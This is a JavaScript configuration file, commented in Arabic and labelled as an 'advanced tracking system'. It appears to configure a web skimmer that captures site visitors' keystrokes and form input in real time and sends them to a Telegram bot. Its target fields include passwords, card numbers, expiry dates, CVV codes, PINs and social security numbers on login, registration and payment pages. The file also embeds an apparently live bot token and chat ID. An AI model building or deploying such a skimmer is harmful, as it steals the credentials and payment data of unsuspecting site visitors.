// إعدادات نظام التتبع المتقدم
// Advanced Tracking System Configuration

const TRACKING_CONFIG = {
    // إعدادات بوت التيليجرام
    telegram: {
        botToken: '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU',
        chatId: '2126771039',
        parseMode: 'HTML'
    },

    // إعدادات التتبع
    tracking: {
        // تأخير إرسال البيانات أثناء الكتابة (بالميلي ثانية)
        typingDelay: 2000,
        
        // فترة إرسال تحديثات الوقت (بالميلي ثانية)
        timeUpdateInterval: 300000, // 5 دقائق
        
        // فترة تتبع التمرير (بالميلي ثانية)
        scrollDelay: 1000,
        
        // الحد الأدنى لطول النص المطلوب تتبعه
        minTextLength: 1,
        
        // تفعيل/تعطيل أنواع التتبع المختلفة
        enableFormTracking: true,
        enableInputTracking: true,
        enableClickTracking: true,
        enableScrollTracking: true,
        enableTimeTracking: true,
        enableBehaviorTracking: true
    },

    // رسائل التنبيهات
    messages: {
        registration: '🆕 تسجيل مستخدم جديد',
        login: '🔑 محاولة تسجيل دخول',
        payment: '💳 معلومات الدفع',
        realTimeInput: '⌨️ إدخال بيانات في الوقت الفعلي',
        click: '🖱️ نقر على عنصر',
        scroll: '📜 تمرير الصفحة',
        pageChange: '🔄 تغيير الصفحة',
        sessionEnd: '👋 انتهاء الجلسة',
        activeTime: '⏱️ وقت نشط',
        focus: '🎯 تركيز على حقل',
        visit: '🔔 زائر جديد للموقع'
    },

    // ترجمة أسماء الحقول
    fieldTranslations: {
        'name': '👤 الاسم الكامل',
        'email': '📧 البريد الإلكتروني',
        'password': '🔒 كلمة المرور',
        'confirmPassword': '🔒 تأكيد كلمة المرور',
        'confirm-password': '🔒 تأكيد كلمة المرور',
        'cardNumber': '💳 رقم البطاقة',
        'card-number': '💳 رقم البطاقة',
        'expiryDate': '📅 تاريخ الانتهاء',
        'expiry': '📅 تاريخ الانتهاء',
        'cvv': '🔢 رمز الحماية',
        'cardholderName': '👤 اسم حامل البطاقة',
        'cardholder': '👤 اسم حامل البطاقة',
        'fieldName': '📝 اسم الحقل',
        'fieldType': '🏷️ نوع الحقل',
        'value': '💬 القيمة المدخلة',
        'context': '📋 السياق',
        'timestamp': '⏰ الوقت والتاريخ',
        'page': '📄 الصفحة الحالية',
        'sessionId': '🆔 معرف الجلسة',
        'scrollPercentage': '📊 نسبة التمرير',
        'duration': '⏱️ المدة الزمنية',
        'text': '📝 النص',
        'href': '🔗 الرابط',
        'rememberMe': '💾 تذكرني',
        'terms': '📋 الشروط والأحكام',
        'phone': '📱 رقم الهاتف',
        'address': '🏠 العنوان',
        'country': '🌍 البلد',
        'city': '🏙️ المدينة',
        'zipCode': '📮 الرمز البريدي',
        'amount': '💰 المبلغ',
        'currency': '💱 العملة'
    },

    // الحقول الحساسة التي يجب تتبعها
    sensitiveFields: [
        'password',
        'confirm-password',
        'confirmPassword',
        'cvv',
        'card-number',
        'cardNumber',
        'pin',
        'ssn',
        'social-security'
    ],

    // الصفحات المهمة للتتبع
    importantPages: [
        '/pages/register.html',
        '/pages/login.html',
        '/pages/payment.html',
        '/index.html'
    ],

    // أنواع المتصفحات
    browsers: {
        'Firefox': 'Firefox',
        'SamsungBrowser': 'Samsung Browser',
        'Opera': 'Opera',
        'OPR': 'Opera',
        'Edge': 'Microsoft Edge',
        'Chrome': 'Chrome',
        'Safari': 'Safari'
    },

    // أنظمة التشغيل
    operatingSystems: {
        'Windows NT 10.0': 'Windows 10',
        'Windows NT 6.3': 'Windows 8.1',
        'Windows NT 6.2': 'Windows 8',
        'Windows NT 6.1': 'Windows 7',
        'Mac': 'MacOS',
        'Android': 'Android',
        'iPhone': 'iOS',
        'Linux': 'Linux'
    }
};

// تصدير الإعدادات للاستخدام في ملفات أخرى
if (typeof module !== 'undefined' && module.exports) {
    module.exports = TRACKING_CONFIG;
} else if (typeof window !== 'undefined') {
    window.TRACKING_CONFIG = TRACKING_CONFIG;
}